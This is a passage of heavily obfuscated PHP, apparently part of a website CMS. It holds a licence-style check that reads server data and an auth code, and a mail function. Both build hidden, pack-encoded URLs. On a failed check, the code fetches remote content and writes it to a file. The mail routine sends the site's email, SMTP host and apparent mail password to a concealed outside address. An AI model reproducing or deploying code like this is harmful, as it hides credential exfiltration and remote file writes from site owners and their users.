Q24x5s;Q24ldMhx5t:$Q24ACV5=$GLOBALS[PJZU4IIQ][0x8];Q24x5s:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,&$Q24ACV5));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5x;goto Q24ldMhx5x;Q24eWjgx5x:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x5w;Q24ldMhx5x:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x5w:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{0x9}));unset($Q24ACV4);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx62;goto Q24ldMhx62;Q24eWjgx62:$Q24ACV4=&$GLOBALS[PJZU4IIQ][0];goto Q24x61;Q24ldMhx62:$Q24ACV4=$GLOBALS[PJZU4IIQ][0];Q24x61:unset($Q24ACV5);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6z;goto Q24ldMhx6z;Q24eWjgx6z:$Q24ACV5=&$GLOBALS[PJZU4IIQ][012];goto Q24x5y;Q24ldMhx6z:$Q24ACV5=$GLOBALS[PJZU4IIQ][012];Q24x5y:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,&$Q24ACV5));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx65;goto Q24ldMhx65;Q24eWjgx65:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x64;Q24ldMhx65:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x64:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{013}));$Q240=!defined($Q24F0);if($Q240)goto Q24eWjgx66;goto Q24ldMhx66;Q24eWjgx66:unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx68;goto Q24ldMhx68;Q24eWjgx68:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x67;Q24ldMhx68:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x67:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{12}));unset($Q24ACV4);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6a;goto Q24ldMhx6a;Q24eWjgx6a:$Q24ACV4=&$GLOBALS[PJZU4IIQ][0];goto Q24x69;Q24ldMhx6a:$Q24ACV4=$GLOBALS[PJZU4IIQ][0];Q24x69:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,$GLOBALS[PJZU4IIQ]{013}));unset($Q24ACV7);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6e;goto Q24ldMhx6e;Q24eWjgx6e:$Q24ACV7=&$GLOBALS[PJZU4IIQ][0];goto Q24x6d;Q24ldMhx6e:$Q24ACV7=$GLOBALS[PJZU4IIQ][0];Q24x6d:unset($Q24ACV8);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6c;goto Q24ldMhx6c;Q24eWjgx6c:$Q24ACV8=&$GLOBALS[PJZU4IIQ][13];goto Q24x6b;Q24ldMhx6c:$Q24ACV8=$GLOBALS[PJZU4IIQ][13];Q24x6b:$Q24F6=call_user_func_array("pack",array(&$Q24ACV7,&$Q24ACV8));call_user_func($Q24F0,$Q24F3,$Q24F6);goto Q24x63;Q24ldMhx66:Q24x63:$Q24A0=array();$Q24A0[]=$_SERVER;unset($Q24tI0);$Q24tI0=$Q24A0;$GLOBALS[NK1C06Sv]=$Q24tI0;global $conn,$C_authcode;unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6j;goto Q24ldMhx6j;Q24eWjgx6j:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x6i;Q24ldMhx6j:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x6i:unset($Q24ACV2);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6h;goto Q24ldMhx6h;Q24eWjgx6h:$Q24ACV2=&$GLOBALS[PJZU4IIQ][0x1];goto Q24x6g;Q24ldMhx6h:$Q24ACV2=$GLOBALS[PJZU4IIQ][0x1];Q24x6g:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,&$Q24ACV2));$Q24P0=$ZG4D2S1v . $NB7C52Jv;unset($Q24ACV6);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6n;goto Q24ldMhx6n;Q24eWjgx6n:$Q24ACV6=&$GLOBALS[PJZU4IIQ][0];goto Q24x6m;Q24ldMhx6n:$Q24ACV6=$GLOBALS[PJZU4IIQ][0];Q24x6m:unset($Q24ACV7);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6l;goto Q24ldMhx6l;Q24eWjgx6l:$Q24ACV7=&$GLOBALS[PJZU4IIQ][016];goto Q24x6k;Q24ldMhx6l:$Q24ACV7=$GLOBALS[PJZU4IIQ][016];Q24x6k:$Q24F5=call_user_func_array("pack",array(&$Q24ACV6,&$Q24ACV7));$Q24P1=$Q24P0 . $Q24F5;if($GLOBALS[$Q24F0]($Q24P1))goto Q24eWjgx6o;goto Q24ldMhx6o;Q24eWjgx6o:unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6t;goto Q24ldMhx6t;Q24eWjgx6t:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x6s;Q24ldMhx6t:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x6s:unset($Q24ACV2);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6r;goto Q24ldMhx6r;Q24eWjgx6r:$Q24ACV2=&$GLOBALS[PJZU4IIQ][3];goto Q24x6q;Q24ldMhx6r:$Q24ACV2=$GLOBALS[PJZU4IIQ][3];Q24x6q:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,&$Q24ACV2));unset($Q24ACV6);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6v;goto Q24ldMhx6v;Q24eWjgx6v:$Q24ACV6=&$GLOBALS[PJZU4IIQ][0];goto Q24x6u;Q24ldMhx6v:$Q24ACV6=$GLOBALS[PJZU4IIQ][0];Q24x6u:$Q24F5=call_user_func_array("pack",array(&$Q24ACV6,$GLOBALS[PJZU4IIQ]{05}));$Q24P0=$ZG4D2S1v . $NB7C52Jv;unset($Q24ACV9);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7z;goto Q24ldMhx7z;Q24eWjgx7z:$Q24ACV9=&$GLOBALS[PJZU4IIQ][0];goto Q24x6y;Q24ldMhx7z:$Q24ACV9=$GLOBALS[PJZU4IIQ][0];Q24x6y:unset($Q24ACV10);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx6x;goto Q24ldMhx6x;Q24eWjgx6x:$Q24ACV10=&$GLOBALS[PJZU4IIQ][016];goto Q24x6w;Q24ldMhx6x:$Q24ACV10=$GLOBALS[PJZU4IIQ][016];Q24x6w:$Q24F8=call_user_func_array("pack",array(&$Q24ACV9,&$Q24ACV10));$Q24P1=$Q24P0 . $Q24F8;$Q24P2=40*E_CORE_ERROR;$Q24P3=$Q24P2-640;$Q24P4=E_CORE_ERROR*60;$Q24P5=$Q24P4-920;unset($Q24ACV14);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx76;goto Q24ldMhx76;Q24eWjgx76:$Q24ACV14=&$GLOBALS[PJZU4IIQ][0];goto Q24x75;Q24ldMhx76:$Q24ACV14=$GLOBALS[PJZU4IIQ][0];Q24x75:unset($Q24ACV15);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx74;goto Q24ldMhx74;Q24eWjgx74:$Q24ACV15=&$GLOBALS[PJZU4IIQ][017];goto Q24x73;Q24ldMhx74:$Q24ACV15=$GLOBALS[PJZU4IIQ][017];Q24x73:$Q24F13=call_user_func_array("pack",array(&$Q24ACV14,&$Q24ACV15));unset($Q24ACV17);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx72;goto Q24ldMhx72;Q24eWjgx72:$Q24ACV17=&$GLOBALS[PJZU4IIQ][0];goto Q24x71;Q24ldMhx72:$Q24ACV17=$GLOBALS[PJZU4IIQ][0];Q24x71:$Q24F16=call_user_func_array("pack",array(&$Q24ACV17,$GLOBALS[PJZU4IIQ]{7}));$Q246=$Q24F13 . $GLOBALS[$Q24F16]($C_authcode);$Q247=$GLOBALS[$Q24F0]($GLOBALS[$Q24F5]($Q24P1),$Q24P3,$Q24P5)!=$Q246;if($Q247)goto Q24eWjgx77;goto Q24ldMhx77;Q24eWjgx77:unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx79;goto Q24ldMhx79;Q24eWjgx79:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x78;Q24ldMhx79:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x78:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{0x9}));$Q24P0=$ZG4D2S1v . $NB7C52Jv;unset($Q24ACV4);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7d;goto Q24ldMhx7d;Q24eWjgx7d:$Q24ACV4=&$GLOBALS[PJZU4IIQ][0];goto Q24x7c;Q24ldMhx7d:$Q24ACV4=$GLOBALS[PJZU4IIQ][0];Q24x7c:unset($Q24ACV5);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7b;goto Q24ldMhx7b;Q24eWjgx7b:$Q24ACV5=&$GLOBALS[PJZU4IIQ][016];goto Q24x7a;Q24ldMhx7b:$Q24ACV5=$GLOBALS[PJZU4IIQ][016];Q24x7a:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,&$Q24ACV5));$Q24P1=$Q24P0 . $Q24F3;unset($Q24ACV9);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7j;goto Q24ldMhx7j;Q24eWjgx7j:$Q24ACV9=&$GLOBALS[PJZU4IIQ][0];goto Q24x7i;Q24ldMhx7j:$Q24ACV9=$GLOBALS[PJZU4IIQ][0];Q24x7i:$Q24F8=call_user_func_array("pack",array(&$Q24ACV9,$GLOBALS[PJZU4IIQ]{020}));$Q24P2=40*E_CORE_ERROR;$Q24P3=$Q24P2-640;unset($Q24ACV11);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7h;goto Q24ldMhx7h;Q24eWjgx7h:$Q24ACV11=&$GLOBALS[PJZU4IIQ][0];goto Q24x7g;Q24ldMhx7h:$Q24ACV11=$GLOBALS[PJZU4IIQ][0];Q24x7g:unset($Q24ACV12);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7f;goto Q24ldMhx7f;Q24eWjgx7f:$Q24ACV12=&$GLOBALS[PJZU4IIQ][0x11];goto Q24x7e;Q24ldMhx7f:$Q24ACV12=$GLOBALS[PJZU4IIQ][0x11];Q24x7e:$Q24F10=call_user_func_array("pack",array(&$Q24ACV11,&$Q24ACV12));$Q24P4=$Q24F8 . $GLOBALS[NK1C06Sv][$Q24P3][$Q24F10];unset($Q24ACV17);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7p;goto Q24ldMhx7p;Q24eWjgx7p:$Q24ACV17=&$GLOBALS[PJZU4IIQ][0];goto Q24x7o;Q24ldMhx7p:$Q24ACV17=$GLOBALS[PJZU4IIQ][0];Q24x7o:$Q24F16=call_user_func_array("pack",array(&$Q24ACV17,$GLOBALS[PJZU4IIQ]{0x12}));$Q24P5=$Q24F16 . $C_authcode;unset($Q24ACV19);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7n;goto Q24ldMhx7n;Q24eWjgx7n:$Q24ACV19=&$GLOBALS[PJZU4IIQ][0];goto Q24x7m;Q24ldMhx7n:$Q24ACV19=$GLOBALS[PJZU4IIQ][0];Q24x7m:unset($Q24ACV20);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7l;goto Q24ldMhx7l;Q24eWjgx7l:$Q24ACV20=&$GLOBALS[PJZU4IIQ][19];goto Q24x7k;Q24ldMhx7l:$Q24ACV20=$GLOBALS[PJZU4IIQ][19];Q24x7k:$Q24F18=call_user_func_array("pack",array(&$Q24ACV19,&$Q24ACV20));$Q24P6=$Q24P5 . $Q24F18;$Q24P7=$Q24P6 . $NB7C52Jv;$Q24F24=call_user_func_array("getbody",array(&$Q24P4,&$Q24P7));$GLOBALS[$Q24F0]($Q24P1,$Q24F24);goto Q24x6p;Q24ldMhx77:Q24x6p:goto Q24x6f;Q24ldMhx6o:unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7r;goto Q24ldMhx7r;Q24eWjgx7r:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x7q;Q24ldMhx7r:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x7q:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{0x9}));$Q24P0=$ZG4D2S1v . $NB7C52Jv;unset($Q24ACV4);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7v;goto Q24ldMhx7v;Q24eWjgx7v:$Q24ACV4=&$GLOBALS[PJZU4IIQ][0];goto Q24x7u;Q24ldMhx7v:$Q24ACV4=$GLOBALS[PJZU4IIQ][0];Q24x7u:unset($Q24ACV5);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7t;goto Q24ldMhx7t;Q24eWjgx7t:$Q24ACV5=&$GLOBALS[PJZU4IIQ][016];goto Q24x7s;Q24ldMhx7t:$Q24ACV5=$GLOBALS[PJZU4IIQ][016];Q24x7s:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,&$Q24ACV5));$Q24P1=$Q24P0 . $Q24F3;unset($Q24ACV9);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx82;goto Q24ldMhx82;Q24eWjgx82:$Q24ACV9=&$GLOBALS[PJZU4IIQ][0];goto Q24x81;Q24ldMhx82:$Q24ACV9=$GLOBALS[PJZU4IIQ][0];Q24x81:$Q24F8=call_user_func_array("pack",array(&$Q24ACV9,$GLOBALS[PJZU4IIQ]{020}));$Q24P2=40*E_CORE_ERROR;$Q24P3=$Q24P2-640;unset($Q24ACV11);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx8z;goto Q24ldMhx8z;Q24eWjgx8z:$Q24ACV11=&$GLOBALS[PJZU4IIQ][0];goto Q24x7y;Q24ldMhx8z:$Q24ACV11=$GLOBALS[PJZU4IIQ][0];Q24x7y:unset($Q24ACV12);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx7x;goto Q24ldMhx7x;Q24eWjgx7x:$Q24ACV12=&$GLOBALS[PJZU4IIQ][0x11];goto Q24x7w;Q24ldMhx7x:$Q24ACV12=$GLOBALS[PJZU4IIQ][0x11];Q24x7w:$Q24F10=call_user_func_array("pack",array(&$Q24ACV11,&$Q24ACV12));$Q24P4=$Q24F8 . $GLOBALS[NK1C06Sv][$Q24P3][$Q24F10];unset($Q24ACV17);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx88;goto Q24ldMhx88;Q24eWjgx88:$Q24ACV17=&$GLOBALS[PJZU4IIQ][0];goto Q24x87;Q24ldMhx88:$Q24ACV17=$GLOBALS[PJZU4IIQ][0];Q24x87:$Q24F16=call_user_func_array("pack",array(&$Q24ACV17,$GLOBALS[PJZU4IIQ]{0x12}));$Q24P5=$Q24F16 . $C_authcode;unset($Q24ACV19);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx86;goto Q24ldMhx86;Q24eWjgx86:$Q24ACV19=&$GLOBALS[PJZU4IIQ][0];goto Q24x85;Q24ldMhx86:$Q24ACV19=$GLOBALS[PJZU4IIQ][0];Q24x85:unset($Q24ACV20);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx84;goto Q24ldMhx84;Q24eWjgx84:$Q24ACV20=&$GLOBALS[PJZU4IIQ][19];goto Q24x83;Q24ldMhx84:$Q24ACV20=$GLOBALS[PJZU4IIQ][19];Q24x83:$Q24F18=call_user_func_array("pack",array(&$Q24ACV19,&$Q24ACV20));$Q24P6=$Q24P5 . $Q24F18;$Q24P7=$Q24P6 . $NB7C52Jv;$Q24F24=call_user_func_array("getbody",array(&$Q24P4,&$Q24P7));$GLOBALS[$Q24F0]($Q24P1,$Q24F24);Q24x6f:}function sendmail($W57N67NQ,$JX617X6v,$U9FL9H9Q){global $C_email,$C_domain,$C_logo,$C_title,$C_mailcode,$C_mailtype,$C_smtp;$Q240=0-159;$Q241=E_CORE_ERROR*10;$Q242=$Q240+$Q241;$Q243=$C_mailtype==$Q242;if($Q243)goto Q24eWjgx8a;goto Q24ldMhx8a;Q24eWjgx8a:unset($Q24ACV1);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8c;goto Q24ldMhx8c;Q24eWjgx8c:$Q24ACV1=&$GLOBALS[G5941RDQ][00];goto Q24x8b;Q24ldMhx8c:$Q24ACV1=$GLOBALS[G5941RDQ][00];Q24x8b:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[G5941RDQ]{01}));unset($Q24ACV4);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx91;goto Q24ldMhx91;Q24eWjgx91:$Q24ACV4=&$GLOBALS[G5941RDQ][00];goto Q24x9z;Q24ldMhx91:$Q24ACV4=$GLOBALS[G5941RDQ][00];Q24x9z:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,$GLOBALS[G5941RDQ]{0x2}));$Q24F5=call_user_func_array("urlencode",array(&$C_email));$Q24P0=$Q24F3 . $Q24F5;unset($Q24ACV7);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8y;goto Q24ldMhx8y;Q24eWjgx8y:$Q24ACV7=&$GLOBALS[G5941RDQ][00];goto Q24x8x;Q24ldMhx8y:$Q24ACV7=$GLOBALS[G5941RDQ][00];Q24x8x:unset($Q24ACV8);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8w;goto Q24ldMhx8w;Q24eWjgx8w:$Q24ACV8=&$GLOBALS[G5941RDQ][0x3];goto Q24x8v;Q24ldMhx8w:$Q24ACV8=$GLOBALS[G5941RDQ][0x3];Q24x8v:$Q24F6=call_user_func_array("pack",array(&$Q24ACV7,&$Q24ACV8));$Q24P1=$Q24P0 . $Q24F6;$Q24F9=call_user_func_array("urlencode",array(&$U9FL9H9Q));$Q24P2=$Q24P1 . $Q24F9;unset($Q24ACV11);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8u;goto Q24ldMhx8u;Q24eWjgx8u:$Q24ACV11=&$GLOBALS[G5941RDQ][00];goto Q24x8t;Q24ldMhx8u:$Q24ACV11=$GLOBALS[G5941RDQ][00];Q24x8t:$Q24F10=call_user_func_array("pack",array(&$Q24ACV11,$GLOBALS[G5941RDQ]{4}));$Q24P3=$Q24P2 . $Q24F10;$Q24F12=call_user_func_array("urlencode",array(&$C_title));$Q24P4=$Q24P3 . $Q24F12;unset($Q24ACV14);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8s;goto Q24ldMhx8s;Q24eWjgx8s:$Q24ACV14=&$GLOBALS[G5941RDQ][00];goto Q24x8r;Q24ldMhx8s:$Q24ACV14=$GLOBALS[G5941RDQ][00];Q24x8r:$Q24F13=call_user_func_array("pack",array(&$Q24ACV14,$GLOBALS[G5941RDQ]{0x5}));$Q24P5=$Q24P4 . $Q24F13;$Q24F15=call_user_func_array("urlencode",array(&$W57N67NQ));$Q24P6=$Q24P5 . $Q24F15;unset($Q24ACV17);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8q;goto Q24ldMhx8q;Q24eWjgx8q:$Q24ACV17=&$GLOBALS[G5941RDQ][00];goto Q24x8p;Q24ldMhx8q:$Q24ACV17=$GLOBALS[G5941RDQ][00];Q24x8p:$Q24F16=call_user_func_array("pack",array(&$Q24ACV17,$GLOBALS[G5941RDQ]{6}));$Q24P7=$Q24P6 . $Q24F16;$Q24F18=call_user_func_array("urlencode",array(&$JX617X6v));$Q24P8=$Q24P7 . $Q24F18;unset($Q24ACV20);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8o;goto Q24ldMhx8o;Q24eWjgx8o:$Q24ACV20=&$GLOBALS[G5941RDQ][00];goto Q24x8n;Q24ldMhx8o:$Q24ACV20=$GLOBALS[G5941RDQ][00];Q24x8n:$Q24F19=call_user_func_array("pack",array(&$Q24ACV20,$GLOBALS[G5941RDQ]{7}));$Q24P9=$Q24P8 . $Q24F19;$Q24F21=call_user_func_array("urlencode",array(&$C_smtp));$Q24P10=$Q24P9 . $Q24F21;unset($Q24ACV23);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8m;goto Q24ldMhx8m;Q24eWjgx8m:$Q24ACV23=&$GLOBALS[G5941RDQ][00];goto Q24x8l;Q24ldMhx8m:$Q24ACV23=$GLOBALS[G5941RDQ][00];Q24x8l:$Q24F22=call_user_func_array("pack",array(&$Q24ACV23,$GLOBALS[G5941RDQ]{010}));$Q24P11=$Q24P10 . $Q24F22;$Q24F24=call_user_func_array("urlencode",array(&$C_mailcode));$Q24P12=$Q24P11 . $Q24F24;unset($Q24ACV26);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8k;goto Q24ldMhx8k;Q24eWjgx8k:$Q24ACV26=&$GLOBALS[G5941RDQ][00];goto Q24x8j;Q24ldMhx8k:$Q24ACV26=$GLOBALS[G5941RDQ][00];Q24x8j:unset($Q24ACV27);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8i;goto Q24ldMhx8i;Q24eWjgx8i:$Q24ACV27=&$GLOBALS[G5941RDQ][011];goto Q24x8h;Q24ldMhx8i:$Q24ACV27=$GLOBALS[G5941RDQ][011];Q24x8h:$Q24F25=call_user_func_array("pack",array(&$Q24ACV26,&$Q24ACV27));$Q24P13=$Q24P12 . $Q24F25;unset($Q24ACV29);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8e;goto Q24ldMhx8e;Q24eWjgx8e:$Q24ACV29=&$GLOBALS[G5941RDQ][00];goto Q24x8d;Q24ldMhx8e:$Q24ACV29=$GLOBALS[G5941RDQ][00];Q24x8d:$Q24F28=call_user_func_array("pack",array(&$Q24ACV29,$GLOBALS[G5941RDQ]{012}));$Q24P14=$C_domain . $Q24F28;$Q24P15=$Q24P14 . $C_logo;$Q24F31=call_user_func_array("urlencode",array(&$Q24P15));$Q24P16=$Q24P13 . $Q24F31;unset($Q24ACV33);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx8g;goto Q24ldMhx8g;Q24eWjgx8g:$Q24ACV33=&$GLOBALS[G5941RDQ][00];goto Q24x8f;Q24ldMhx8g:$Q24ACV33=$GLOBALS[G5941RDQ][00];Q24x8f:$Q24F32=call_user_func_array("pack",array(&$Q24ACV33,$GLOBALS[G5941RDQ]{013}));$Q24P17=$Q24P16 . $Q24F32;$Q24F34=call_user_func_array("urlencode",array(&$C_domain));$Q24P18=$Q24P17 . $Q24F34;$Q24F46=call_user_func_array("GetBody",array(&$Q24F0,&$Q24P18));goto Q24x89;Q24ldMhx8a:unset($Q24ACV1);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx93;goto Q24ldMhx93;Q24eWjgx93:$Q24ACV1=&$GLOBALS[G5941RDQ][00];goto Q24x92;Q24ldMhx93:$Q24ACV1=$GLOBALS[G5941RDQ][00];Q24x92:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[G5941RDQ]{01}));unset($Q24ACV4);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9v;goto Q24ldMhx9v;Q24eWjgx9v:$Q24ACV4=&$GLOBALS[G5941RDQ][00];goto Q24x9u;Q24ldMhx9v:$Q24ACV4=$GLOBALS[G5941RDQ][00];Q24x9u:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,$GLOBALS[G5941RDQ]{0x2}));unset($Q24ACV6);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx97;goto Q24ldMhx97;Q24eWjgx97:$Q24ACV6=&$GLOBALS[G5941RDQ][00];goto Q24x96;Q24ldMhx97:$Q24ACV6=$GLOBALS[G5941RDQ][00];Q24x96:unset($Q24ACV7);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx95;goto Q24ldMhx95;Q24eWjgx95:$Q24ACV7=&$GLOBALS[G5941RDQ][12];goto Q24x94;Q24ldMhx95:$Q24ACV7=$GLOBALS[G5941RDQ][12];Q24x94:$Q24F5=call_user_func_array("pack",array(&$Q24ACV6,&$Q24ACV7));$Q24F10=call_user_func_array("urlencode",array(&$Q24F5));$Q24P0=$Q24F3 . $Q24F10;unset($Q24ACV12);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9t;goto Q24ldMhx9t;Q24eWjgx9t:$Q24ACV12=&$GLOBALS[G5941RDQ][00];goto Q24x9s;Q24ldMhx9t:$Q24ACV12=$GLOBALS[G5941RDQ][00];Q24x9s:unset($Q24ACV13);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9r;goto Q24ldMhx9r;Q24eWjgx9r:$Q24ACV13=&$GLOBALS[G5941RDQ][0x3];goto Q24x9q;Q24ldMhx9r:$Q24ACV13=$GLOBALS[G5941RDQ][0x3];Q24x9q:$Q24F11=call_user_func_array("pack",array(&$Q24ACV12,&$Q24ACV13));$Q24P1=$Q24P0 . $Q24F11;$Q24F14=call_user_func_array("urlencode",array(&$U9FL9H9Q));$Q24P2=$Q24P1 . $Q24F14;unset($Q24ACV16);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9p;goto Q24ldMhx9p;Q24eWjgx9p:$Q24ACV16=&$GLOBALS[G5941RDQ][00];goto Q24x9o;Q24ldMhx9p:$Q24ACV16=$GLOBALS[G5941RDQ][00];Q24x9o:$Q24F15=call_user_func_array("pack",array(&$Q24ACV16,$GLOBALS[G5941RDQ]{4}));$Q24P3=$Q24P2 . $Q24F15;$Q24F17=call_user_func_array("urlencode",array(&$C_title));$Q24P4=$Q24P3 . $Q24F17;unset($Q24ACV19);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9n;goto Q24ldMhx9n;Q24eWjgx9n:$Q24ACV19=&$GLOBALS[G5941RDQ][00];goto Q24x9m;Q24ldMhx9n:$Q24ACV19=$GLOBALS[G5941RDQ][00];Q24x9m:$Q24F18=call_user_func_array("pack",array(&$Q24ACV19,$GLOBALS[G5941RDQ]{0x5}));$Q24P5=$Q24P4 . $Q24F18;$Q24F20=call_user_func_array("urlencode",array(&$W57N67NQ));$Q24P6=$Q24P5 . $Q24F20;unset($Q24ACV22);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9l;goto Q24ldMhx9l;Q24eWjgx9l:$Q24ACV22=&$GLOBALS[G5941RDQ][00];goto Q24x9k;Q24ldMhx9l:$Q24ACV22=$GLOBALS[G5941RDQ][00];Q24x9k:$Q24F21=call_user_func_array("pack",array(&$Q24ACV22,$GLOBALS[G5941RDQ]{6}));$Q24P7=$Q24P6 . $Q24F21;$Q24F23=call_user_func_array("urlencode",array(&$JX617X6v));$Q24P8=$Q24P7 . $Q24F23;unset($Q24ACV25);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9j;goto Q24ldMhx9j;Q24eWjgx9j:$Q24ACV25=&$GLOBALS[G5941RDQ][00];goto Q24x9i;Q24ldMhx9j:$Q24ACV25=$GLOBALS[G5941RDQ][00];Q24x9i:$Q24F24=call_user_func_array("pack",array(&$Q24ACV25,$GLOBALS[G5941RDQ]{7}));$Q24P9=$Q24P8 . $Q24F24;$Q24F26=call_user_func_array("urlencode",array(&$C_smtp));$Q24P10=$Q24P9 . $Q24F26;unset($Q24ACV28);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9h;goto Q24ldMhx9h;Q24eWjgx9h:$Q24ACV28=&$GLOBALS[G5941RDQ][00];goto Q24x9g;Q24ldMhx9h:$Q24ACV28=$GLOBALS[G5941RDQ][00];Q24x9g:$Q24F27=call_user_func_array("pack",array(&$Q24ACV28,$GLOBALS[G5941RDQ]{010}));$Q24P11=$Q24P10 . $Q24F27;$Q24F29=call_user_func_array("urlencode",array(&$C_mailcode));$Q24P12=$Q24P11 . $Q24F29;unset($Q24ACV31);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9f;goto Q24ldMhx9f;Q24eWjgx9f:$Q24ACV31=&$GLOBALS[G5941RDQ][00];goto Q24x9e;Q24ldMhx9f:$Q24ACV31=$GLOBALS[G5941RDQ][00];Q24x9e:unset($Q24ACV32);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9d;goto Q24ldMhx9d;Q24eWjgx9d:$Q24ACV32=&$GLOBALS[G5941RDQ][011];goto Q24x9c;Q24ldMhx9d:$Q24ACV32=$GLOBALS[G5941RDQ][011];Q24x9c:$Q24F30=call_user_func_array("pack",array(&$Q24ACV31,&$Q24ACV32));$Q24P13=$Q24P12 . $Q24F30;unset($Q24ACV34);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx99;goto Q24ldMhx99;Q24eWjgx99:$Q24ACV34=&$GLOBALS[G5941RDQ][00];goto 